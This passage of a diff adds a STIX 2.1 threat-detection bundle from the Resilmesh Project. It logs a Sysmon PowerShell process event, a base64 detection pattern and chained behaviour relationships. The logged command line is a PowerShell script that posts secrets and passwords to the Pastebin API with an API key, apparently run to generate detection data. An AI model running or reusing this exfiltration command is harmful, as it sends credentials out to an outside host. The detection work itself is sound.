+                        "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
+                        "terminalSessionId": "0",
+                        "user": "WIN-1\\\\windows-1",
+                        "utcTime": "2025-07-16 11:25:22.918"
+                    },
+                    "WinSystemData": {
+                        "channel": "Microsoft-Windows-Sysmon/Operational",
+                        "computer": "win-1.sri.local",
+                        "eventID": "1",
+                        "eventRecordID": "3240014",
+                        "keywords": "0x8000000000000000",
+                        "level": "4",
+                        "message": "\"Process Create:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-07-16 11:25:22.918\r\nProcessGuid: {0d343e97-8c22-6877-8301-000000001e00}\r\nProcessId: 4920\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.19041.3996 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft Windows Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: \"powershell.exe\" & {$apiKey = \\\"\"6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0\\\"\"\n$content = \\\"\"secrets, api keys, passwords...\\\"\"\n$url = \\\"\"https://pastebin.com/api/api_post.php\\\"\"\n$postData = @{\n  api_dev_key   = $apiKey\n  api_option    = \\\"\"paste\\\"\"\n  api_paste_code = $content\n}\n$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData\nWrite-Host \\\"\"Your paste URL: $response\\\"\"}\r\nCurrentDirectory: C:\\Users\\windows-1\\AppData\\Local\\Temp\\\r\nUser: WIN-1\\windows-1\r\nLogonGuid: {0d343e97-89f3-6877-1981-230000000000}\r\nLogonId: 0x238119\r\nTerminalSessionId: 0\r\nIntegrityLevel: High\r\nHashes: SHA1=801262E122DB6A2E758962896F260B55BBD0136A,MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6\r\nParentProcessGuid: {0d343e97-89fa-6877-3901-000000001e00}\r\nParentProcessId: 5812\r\nParentImage: C:\\PROGRA~1\\PowerShell\\7\\pwsh.exe\r\nParentCommandLine: \"C:\\progra~1\\powershell\\7\\pwsh.exe\" -sshs\r\nParentUser: WIN-1\\windows-1\"",
+                        "opcode": "0",
+                        "processID": "3448",
+                        "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}",
+                        "providerName": "Microsoft-Windows-Sysmon",
+                        "severityValue": "INFORMATION",
+                        "systemTime": "2025-07-16T11:25:22.9229715Z",
+                        "task": "1",
+                        "threadID": "3752",
+                        "version": "5"
+                    }
+                }
+            ],
+            "analytic": {
+                "rule": "WwogIHByb2Nlc3M6bmFtZSA9ICdwb3dlcnNoZWxsLmV4ZScgQU5EIAogIChwcm9jZXNzOmNvbW1hbmRfbGluZSBNQVRDSEVTICcoP2kpLipJbnZva2UtUmVzdE1ldGhvZFxccystVXJpLiotTWV0aG9kXFxzK1Bvc3QuKicpCkFORCAocHJvY2Vzczpjb21tYW5kX2xpbmUgTUFUQ0hFUyAnKD9pKS4qcGFzdGViaW5cXC5jb20uKicKICAgICkKXQ==",
+                "type": "Stix Pattern"
+            },
+            "extensions": {
+                "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249": {
+                    "extension_type": "new-sdo"
+                }
+            }
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--64c3a72c-404b-4c5e-9286-30049f01d4d9",
+            "created": "2025-07-16T11:25:25.834922Z",
+            "modified": "2025-07-16T11:25:25.834922Z",
+            "relationship_type": "detects",
+            "source_ref": "x-oca-behavior--ac1b3bec-bb78-4793-afdc-8e6874f9b1bb",
+            "target_ref": "x-oca-detection--45cb43dd-a73d-464e-bc4c-af10af1f795f"
+        },
+        {
+            "type": "identity",
+            "spec_version": "2.1",
+            "id": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:00.74821Z",
+            "modified": "2025-07-16T11:25:00.74821Z",
+            "name": "Resilmesh Project"
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--f37d7bd3-a9bd-4ee3-8767-c0038859f162",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:00.749282Z",
+            "modified": "2025-07-16T11:25:00.749282Z",
+            "name": "x-oca-behavior Extension Definition",
+            "description": "This schema creates a new object type called x-oca-behavior. x-oca-behavior objects describe higher-level functionality than can be described using SCOs.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-behavior.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--f0ae41ea-41ea-43f7-aac8-51cae0b65249",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:00.750143Z",
+            "modified": "2025-07-16T11:25:00.750143Z",
+            "name": "x-oca-detection Extension Definition",
+            "description": "This schema creates a new object type called detection, which contain queries or other actionable information that can identify an event or behavior.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-detection.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--76cb7227-e127-49fa-9cf7-5782fae31b77",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:00.749967Z",
+            "modified": "2025-07-16T11:25:00.749967Z",
+            "name": "x-oca-detector Extension Definition",
+            "description": "This schema creates a new object type called detector, which describes software that is capable of performing detections.",
+            "schema": "https://raw.githubusercontent.com/opencybersecurityalliance/stix-extensions/main/2.x/schemas/x-oca-detector.json",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "extension-definition",
+            "spec_version": "2.1",
+            "id": "extension-definition--c75de314-2c96-4e0b-9fcf-61fff0f2f122",
+            "created_by_ref": "identity--8fcde807-e409-4d4b-8602-95ef5d3f300b",
+            "created": "2025-07-16T11:25:00.750296Z",
+            "modified": "2025-07-16T11:25:00.750296Z",
+            "name": "x-oca-asset Extension Definition",
+            "description": "This schema creates a new object type called x-oca-asset.",
+            "schema": "TBD",
+            "version": "1.0.0",
+            "extension_types": [
+                "new-sdo"
+            ]
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--ed7bb608-0e72-4ebb-84cd-35ec869908c3",
+            "created": "2025-07-16T11:25:25.83597Z",
+            "modified": "2025-07-16T11:25:25.83597Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--b3067773-8b2b-4a01-a3e5-043e188131fd",
+            "target_ref": "x-oca-behavior--a0db4b31-f163-4116-a5a7-b747fe116006"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--a967f67c-9deb-40c4-9eb5-c012a630baa9",
+            "created": "2025-07-16T11:25:25.836524Z",
+            "modified": "2025-07-16T11:25:25.836524Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--a0db4b31-f163-4116-a5a7-b747fe116006",
+            "target_ref": "x-oca-behavior--b2ea2e3c-f80c-4f1d-9982-9ddc77b038e1"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--3bd23762-2527-41d9-b838-775064ae3569",
+            "created": "2025-07-16T11:25:25.837091Z",
+            "modified": "2025-07-16T11:25:25.837091Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--b2ea2e3c-f80c-4f1d-9982-9ddc77b038e1",
+            "target_ref": "x-oca-behavior--a21d1114-4662-427a-9e01-ebde118840a9"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--98f35deb-c4e5-4bec-91e1-e7f136905d4c",
+            "created": "2025-07-16T11:25:25.837582Z",
+            "modified": "2025-07-16T11:25:25.837582Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--a21d1114-4662-427a-9e01-ebde118840a9",
+            "target_ref": "x-oca-behavior--41f7db38-a41c-4f0f-9bb6-7122072e4de5"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--92527353-e4dc-4946-954e-c883c723bb54",
+            "created": "2025-07-16T11:25:25.838127Z",
+            "modified": "2025-07-16T11:25:25.838127Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--41f7db38-a41c-4f0f-9bb6-7122072e4de5",
+            "target_ref": "x-oca-behavior--2e7e218d-2c85-48a3-9f62-28c3968bf9cc"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--516e2fe4-0622-40ba-a6f2-c2d66a255481",
+            "created": "2025-07-16T11:25:25.838639Z",
+            "modified": "2025-07-16T11:25:25.838639Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--2e7e218d-2c85-48a3-9f62-28c3968bf9cc",
+            "target_ref": "x-oca-behavior--caf4eaac-0582-47c1-ba5b-fd047a94e308"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--15457e70-c21b-4653-8793-9f5365e1da32",
+            "created": "2025-07-16T11:25:25.839127Z",
+            "modified": "2025-07-16T11:25:25.839127Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--caf4eaac-0582-47c1-ba5b-fd047a94e308",
+            "target_ref": "x-oca-behavior--9e9040ac-f2d7-4430-a112-3dcd4b4d7289"
+        },
+        {
+            "type": "relationship",
+            "spec_version": "2.1",
+            "id": "relationship--37eb76a8-e71e-44e4-82e9-7395e89cfaea",
+            "created": "2025-07-16T11:25:25.839711Z",
+            "modified": "2025-07-16T11:25:25.839711Z",
+            "relationship_type": "occurs-before",
+            "source_ref": "x-oca-behavior--9e9040ac-f2d7-4430-a112-3dcd4b4d7289",
+            "target_ref": "x-oca-behavior--ac1b3bec-bb78-4793-afdc-8e6874f9b1bb"
+        }
+    ]
+}
